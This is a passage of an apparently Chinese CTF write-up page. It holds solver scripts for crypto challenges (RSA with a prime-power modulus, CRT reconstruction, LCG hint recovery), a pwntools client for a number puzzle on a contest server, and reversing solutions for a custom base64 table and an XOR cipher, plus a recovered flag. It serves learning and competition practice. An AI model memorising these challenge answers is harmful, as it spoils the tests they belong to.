+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> n <span style="color:#f92672">%</span> (p<span style="color:#f92672">**</span><span style="color:#ae81ff">3</span> <span style="color:#f92672">*</span> q_candidate<span style="color:#f92672">**</span><span style="color:#ae81ff">2</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">and</span> isPrime(q_candidate):
+</span></span><span style="display:flex;"><span>            q <span style="color:#f92672">=</span> q_candidate
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;q = </span><span style="color:#e6db74">{</span>q<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 计算 phi(n) = p^2 * (p-1) * q * (q-1)</span>
+</span></span><span style="display:flex;"><span>phi <span style="color:#f92672">=</span> (p<span style="color:#f92672">**</span><span style="color:#ae81ff">2</span>) <span style="color:#f92672">*</span> (p<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> q <span style="color:#f92672">*</span> (q<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 解密</span>
+</span></span><span style="display:flex;"><span>e <span style="color:#f92672">=</span> <span style="color:#ae81ff">65537</span>
+</span></span><span style="display:flex;"><span>d <span style="color:#f92672">=</span> inverse(e, phi)
+</span></span><span style="display:flex;"><span>m <span style="color:#f92672">=</span> pow(c, d, n)
+</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> long_to_bytes(m)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Flag: </span><span style="color:#e6db74">{</span>flag<span style="color:#f92672">.</span>decode()<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="复制代码"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>拿到flag
+    <img src="../imgs/image-20250929171127388.png" alt="image-20250929171127388"  loading="lazy" /></p>
+<h3>唯一表示<span class="hx:absolute hx:-mt-20" id="唯一表示"></span>
+    <a href="#%e5%94%af%e4%b8%80%e8%a1%a8%e7%a4%ba" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>根据给定的余数列表和对应的素数，使用 CRT 重建原始整数 <em>n</em>。然后将这个整数转换回字节表示，最终解码为字符串。</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> sympy.ntheory.modular <span style="color:#f92672">import</span> crt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Util.number <span style="color:#f92672">import</span> long_to_bytes
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 给定的余数列表</span>
+</span></span><span style="display:flex;"><span>remainders <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">23</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">30</span>, <span style="color:#ae81ff">35</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">18</span>, <span style="color:#ae81ff">30</span>, <span style="color:#ae81ff">55</span>, <span style="color:#ae81ff">60</span>, <span style="color:#ae81ff">29</span>, <span style="color:#ae81ff">42</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">49</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">69</span>, <span style="color:#ae81ff">26</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">73</span>, <span style="color:#ae81ff">84</span>, <span style="color:#ae81ff">67</span>, <span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">77</span>, <span style="color:#ae81ff">72</span>, <span style="color:#ae81ff">127</span>, <span style="color:#ae81ff">49</span>, <span style="color:#ae81ff">57</span>, <span style="color:#ae81ff">74</span>, <span style="color:#ae81ff">70</span>, <span style="color:#ae81ff">129</span>, <span style="color:#ae81ff">146</span>, <span style="color:#ae81ff">45</span>, <span style="color:#ae81ff">35</span>, <span style="color:#ae81ff">180</span>, <span style="color:#ae81ff">196</span>, <span style="color:#ae81ff">101</span>, <span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">146</span>, <span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">194</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">161</span>, <span style="color:#ae81ff">35</span>, <span style="color:#ae81ff">155</span>
+</span></span><span style="display:flex;"><span>]
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 生成素数列表</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> sympy <span style="color:#f92672">import</span> primerange
+</span></span><span style="display:flex;"><span>primes <span style="color:#f92672">=</span> list(primerange(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">114514</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 使用 CRT 重建原始整数</span>
+</span></span><span style="display:flex;"><span>reconstructed, _ <span style="color:#f92672">=</span> crt(primes[:len(remainders)], remainders)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>message_bytes <span style="color:#f92672">=</span> long_to_bytes(reconstructed)
+</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> message_bytes<span style="color:#f92672">.</span>decode()
+</span></span><span style="display:flex;"><span>print(flag)</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="复制代码"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>拿到flag{9c8589c2-aecb-4ec4-b027-654bc322e2d1}</p>
+<h3>小跳蛙<span class="hx:absolute hx:-mt-20" id="小跳蛙"></span>
+    <a href="#%e5%b0%8f%e8%b7%b3%e8%9b%99" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>分析代码知</p>
+<p>当 <em>a</em>&gt;<em>b</em> 时，青蛙跳到 (<em>a</em>−<em>b</em>,<em>b</em>)。当 <em>a</em>&lt;<em>b</em> 时，青蛙跳到 (<em>a</em>,<em>b</em>−<em>a</em>)。当 <em>a</em>=<em>b</em> 时，青蛙停留在原地。使用正则表达式 <code>r'[()]?(\d+)[,\s]+(\d+)[)]?'</code> 解析用户输入的格式，确保输入是两个整数，用逗号或空格分隔。使用 <code>while</code> 循环处理五轮挑战。如果用户输入错误，提示正确答案并退出循环。编写脚本完成</p>
+<p>nc 连接后观察一下回复的内容</p>
+<p>
+    <img src="../imgs/image-20251001192249821.png" alt="image-20251001192249821"  loading="lazy" /></p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;debug&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">frog_jump</span>(a, b):
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    模拟青蛙的跳跃过程，直到 a == b。
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> a <span style="color:#f92672">!=</span> b:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> a <span style="color:#f92672">&gt;</span> b:
+</span></span><span style="display:flex;"><span>            a <span style="color:#f92672">-=</span> b
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            b <span style="color:#f92672">-=</span> a
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> a, b
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">solve_frog_puzzle</span>(a, b):
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    给定初始位置 (a, b)，计算青蛙的最终位置 (x, y)。
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    x, y <span style="color:#f92672">=</span> frog_jump(a, b)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> x, y
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;8.147.132.32&#34;</span>, <span style="color:#ae81ff">17596</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;If you succeed, I will give you a mysterious flag.&#39;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvline()
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvline()
+</span></span><span style="display:flex;"><span>str1 <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()<span style="color:#f92672">.</span>decode()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 使用正则表达式提取 a 和 b 的值</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> re
+</span></span><span style="display:flex;"><span>pattern <span style="color:#f92672">=</span> <span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;\((\d+),(\d+)\)&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">match</span> <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>search(pattern, str1)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#66d9ef">match</span>:
+</span></span><span style="display:flex;"><span>    a, b <span style="color:#f92672">=</span> map(int, <span style="color:#66d9ef">match</span><span style="color:#f92672">.</span>groups())
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Failed to parse the initial (a, b) values.&#34;</span>)
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>    exit()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 计算最终位置</span>
+</span></span><span style="display:flex;"><span>x, y <span style="color:#f92672">=</span> solve_frog_puzzle(a, b)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 发送答案</span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>x<span style="color:#e6db74">}</span><span style="color:#e6db74">,</span><span style="color:#e6db74">{</span>y<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">4</span>):
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;flag!&#34;</span>)
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvline()
+</span></span><span style="display:flex;"><span>    c <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()<span style="color:#f92672">.</span>decode()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">match</span> <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>search(pattern, c)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#66d9ef">match</span>:
+</span></span><span style="display:flex;"><span>        n1, n2 <span style="color:#f92672">=</span> map(int, <span style="color:#66d9ef">match</span><span style="color:#f92672">.</span>groups())
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Failed to parse the (a, b) values.&#34;</span>)
+</span></span><span style="display:flex;"><span>        p<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>        exit()
+</span></span><span style="display:flex;"><span>    x, y <span style="color:#f92672">=</span> solve_frog_puzzle(n1, n2)
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>x<span style="color:#e6db74">}</span><span style="color:#e6db74">,</span><span style="color:#e6db74">{</span>y<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="复制代码"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>
+    <img src="../imgs/image-20251001200624579.png" alt="image-20251001200624579"  loading="lazy" /></p>
+<h3>随机数之旅1<span class="hx:absolute hx:-mt-20" id="随机数之旅1"></span>
+    <a href="#%e9%9a%8f%e6%9c%ba%e6%95%b0%e4%b9%8b%e6%97%851" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>message_int 是未知的，但可以通过给定的 hint 值反向计算出来</p>
+<p>解密脚本</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">recover_message_int</span>(a, p, hint_values):
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    从 hint 序列中恢复 message_int。
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># 取最后一个 hint 值</span>
+</span></span><span style="display:flex;"><span>    hint_i <span style="color:#f92672">=</span> hint_values[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>    hint_i_minus_1 <span style="color:#f92672">=</span> hint_values[<span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># 反向计算 message_int</span>
+</span></span><span style="display:flex;"><span>    message_int <span style="color:#f92672">=</span> (hint_i <span style="color:#f92672">-</span> a <span style="color:#f92672">*</span> hint_i_minus_1) <span style="color:#f92672">%</span> p
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> message_int
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 已知的 a 和 p</span>
+</span></span><span style="display:flex;"><span>a <span style="color:#f92672">=</span> <span style="color:#ae81ff">295789025762601408173828135835543120874436321839537374211067344874253837225114998888279895650663245853</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> <span style="color:#ae81ff">516429062949786265253932153679325182722096129240841519231893318711291039781759818315309383807387756431</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 已知的 hint 序列</span>
+</span></span><span style="display:flex;"><span>hint_values <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">184903644789477348923205958932800932778350668414212847594553173870661019334816268921010695722276438808</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">289189387531555679675902459817169546843094450548753333994152067745494929208355954578346190342131249104</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">511308006207171169525638257022520734897714346965062712839542056097960669854911764257355038593653419751</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">166071289874864336172698289575695453201748407996626084705840173384834203981438122602851131719180238215</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">147110858646297801442262599376129381380715215676113653296571296956264538908861108990498641428275853815</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">414834276462759739846090124494902935141631458647045274550722758670850152829207904420646985446140292244</span>
+</span></span><span style="display:flex;"><span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 恢复 message_int</span>
+</span></span><span style="display:flex;"><span>message_int <span style="color:#f92672">=</span> recover_message_int(a, p, hint_values)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 将 message_int 转换为字节表示</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Util.number <span style="color:#f92672">import</span> long_to_bytes
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> long_to_bytes(message_int)<span style="color:#f92672">.</span>decode()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Recovered flag:&#34;</span>, flag)</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="复制代码"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>
+    <img src="../imgs/image-20251001201929793.png" alt="image-20251001201929793"  loading="lazy" /></p>
+<h2>Reverse<span class="hx:absolute hx:-mt-20" id="reverse"></span>
+    <a href="#reverse" class="subheading-anchor" aria-label="Permalink for this section"></a></h2><h3>Strange Base<span class="hx:absolute hx:-mt-20" id="strange-base"></span>
+    <a href="#strange-base" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>使用IDA打开exe</p>
+<p>
+    <img src="../imgs/image-20250929171922653.png" alt="image-20250929171922653"  loading="lazy" /></p>
+<p>分析，很容易看出是base64换表的问题，这里可以找到已经base64的字符串，接下来找替换的表就完事了。换表base64解码应该就可以得到flag</p>
+<p>shift+f12找字符串</p>
+<p>
+    <img src="../imgs/image-20250929172224839.png" alt="image-20250929172224839"  loading="lazy" /></p>
+<p>这个应该就是</p>
+<p>写脚本解个码</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 要解码的字符串</span>
+</span></span><span style="display:flex;"><span>str1 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>str1 <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;请输入要解码的base64编码：&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># base64替换码表</span>
+</span></span><span style="display:flex;"><span>string1 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;HElLo!A=CrQzy-B4S3|is&#39;waITt1ng&amp;Y0u^{/(&gt;v&lt;)*}GO~256789pPqWXVKJNMF&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># base64原码表</span>
+</span></span><span style="display:flex;"><span>string2 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(base64<span style="color:#f92672">.</span>b64decode(str1<span style="color:#f92672">.</span>translate(str<span style="color:#f92672">.</span>maketrans(string1, string2))))</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="复制代码"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>
+    <img src="../imgs/image-20250929172751542.png" alt="image-20250929172751542"  loading="lazy" /></p>
+<h3>X0r<span class="hx:absolute hx:-mt-20" id="x0r"></span>
+    <a href="#x0r" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>IDA打开发现加密逻辑</p>
+<p>
+    <img src="../imgs/image-20250929180252958.png" alt="image-20250929180252958"  loading="lazy" /></p>
+<p>异或的逆运算还是异或根据加密写解密</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> str[<span style="color:#ae81ff">24</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;anu`ym7wKLl$P]v3q%D]lHpi&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> v5[<span style="color:#ae81ff">3</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> i, j;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> v7 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(str);  <span style="color:#75715e">// 获取字符串长度
+</span></span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 第一轮异或操作
+</span></span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">strlen</span>(str); <span style="color:#f92672">++</span>i) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (i <span style="color:#f92672">%</span> <span style="color:#ae81ff">3</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (i <span style="color:#f92672">%</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>                str[i] <span style="color:#f92672">^=</span> <span style="color:#ae81ff">0x11u</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>                str[i] <span style="color:#f92672">^=</span> <span style="color:#ae81ff">0x45u</span>;
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>            str[i] <span style="color:#f92672">^=</span> <span style="color:#ae81ff">0x14u</span>;  <span style="color:#75715e">// 修复变量名大小写
+</span></span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 设置v5数组
+</span></span></span><span style="display:flex;"><span>    v5[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">19</span>;
+</span></span><span style="display:flex;"><span>    v5[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">19</span>;
+</span></span><span style="display:flex;"><span>    v5[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">81</span>;
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 第二轮异或操作
+</span></span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; j <span style="color:#f92672">&lt;</span> v7; <span style="color:#f92672">++</span>j)
+</span></span><span style="display:flex;"><span>        str[j] <span style="color:#f92672">^=</span> v5[j <span style="color:#f92672">%</span> <span style="color:#ae81ff">3</span>];
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, str);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
